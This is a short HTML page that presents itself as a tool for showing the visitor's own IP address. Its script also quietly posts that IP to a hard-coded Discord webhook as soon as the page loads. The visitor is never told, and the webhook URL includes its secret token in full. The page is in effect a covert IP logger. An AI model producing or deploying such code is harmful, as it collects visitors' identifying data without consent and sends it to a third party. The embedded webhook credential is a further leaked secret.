<html>
  <head>
    <title>My IP Address</title>
    
 
  </head>
  <body>
    <h1>My IP Address</h1>
    <p id="ip-address"></p>
  </body>
  <script>
    // Fetch the IP address from the ipify API
    fetch("https://api.ipify.org?format=json")
      .then(response => response.json())
      .then(data => {
        const IP = data.ip;
        // Display the IP address in the title
        document.title = `My IP Address: ${IP}`;
        // Display the IP address in the page
        document.getElementById("ip-address").innerHTML = IP;

        // Send the IP address to the Discord webhook
        fetch("https://discord.com/api/webhooks/1031273977118740501/IsAWXX8MZ6akhfXsBKtH00HAbZO1QooRf6RcwH5x9My_gYv1Y587Q8sW6xPGO6EcPV2r", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            content: IP,
          }),
        });
      });
  </script>
</html>
